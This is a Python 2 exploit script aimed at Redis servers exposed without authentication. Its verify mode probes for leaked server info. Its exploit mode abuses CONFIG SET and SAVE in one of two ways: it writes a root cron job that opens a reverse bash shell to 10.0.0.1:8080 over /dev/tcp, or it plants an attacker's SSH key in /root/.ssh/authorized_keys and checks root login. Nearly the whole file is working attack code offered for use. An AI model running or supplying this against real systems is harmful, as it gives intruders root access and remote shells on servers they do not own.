#!/usr/bin/python
import redis
import urlparse
import sys
import pexpect
import socket
from optparse import OptionParser


def verify(host, port=6379):
    result = {}
    #info
    payload = "\x2a\x31\x0d\x0a\x24\x34\x0d\x0a\x69\x6e\x66\x6f\x0d\x0a"
    s = socket.socket()
    socket.setdefaulttimeout(20)
    try:
        print host
        s.connect((host, port))
        s.send(payload)
        recvdata = s.recv(1024)
        repr(recvdata)
        if recvdata and 'redis_version' in recvdata:
            result = {}
            result['URL'] = host
            result['Port'] = port
            result['Data'] = recvdata
    except:
        pass
    s.close()
    return result


def shell_exploit(host, port=6379):
    print host
    try:
        r =redis.StrictRedis(host=host,port=port,db=0,socket_timeout=10)
        r.set(1, '\n\n*/1 * * * * /bin/bash -i &gt;&#038; /dev/tcp/10.0.0.1/8080 0&gt;&#038;1\n\n')
        r.config_set('dir','/var/spool/cron')
        r.config_set('dbfilename','root')
        r.save()
        print "attack over, shell return"
    except:
        print "something wrong"
        pass

def ssh_exploit(ssh_content, host, port=6379):
    ssh_content = "\n\n\n\n"+ssh_content+"\n\n\n\n"
    print host
    try:
        r =redis.StrictRedis(host=host,port=port,db=0,socket_timeout=10)
        print ssh_content
        r.set(1, ssh_content)
        r.config_set('dir','/root/.ssh/')
        r.config_set('dbfilename','authorized_keys')
        r.save()
        print "attack over, ssh authorized_keys write"
    except:
        print "something wrong"
        pass

def check(host, filename, SSH_PORT=22):
    print 'Check connecting...'
    try:
        ssh = pexpect.spawn('ssh -i %s root@%s -p %d' %(filename[:-4], host, SSH_PORT))
        i = ssh.expect('[#\$]',timeout=10)
        if i == 0:
            print "Success !"
        else:
            pass
    except:
        print "Failed to connect !"

def main():
    parser = OptionParser()
    parser.add_option("-f", "--file", dest="filename", help="ssh file", metavar="FILE")
    parser.add_option("-u", "--url", dest="url", help="attack redis url")
    parser.add_option("-m", "--mode", dest="mode", help="verify/exploit", default="verify")
    parser.add_option("-p", "--port", dest="port", type="int", help="attack redis port,default:6379", default=6379)

    (options, args) = parser.parse_args()

    #host prepare
    host = urlparse.urlparse(options.url).netloc
    if host == "":host = options.url

    #verify mode
    if options.mode == "verify":
        result = verify(host, options.port)
        if result == {}:
            print "nothing return"
        else:
            print result['URL'],":",result['Port'],"have redis infoleak\ninfo:",result['Data']

    #exploit mode
    if options.mode == "exploit":
        if options.filename == None:
            #reutrn cmd shell exploit
            shell_exploit(host, options.port)
            return
        else:
            #ssh keygen exploit
            print("ssh_key:",options.filename)
            file = open(options.filename, 'rb')
            ssh_content = file.read()
            file.close()
            ssh_exploit(ssh_content, host, options.port)
            #verify ssh-keygen success/fail
            SSH_PORT = 22
            check(host, options.filename, SSH_PORT)
            return

if __name__ == "__main__":
    main()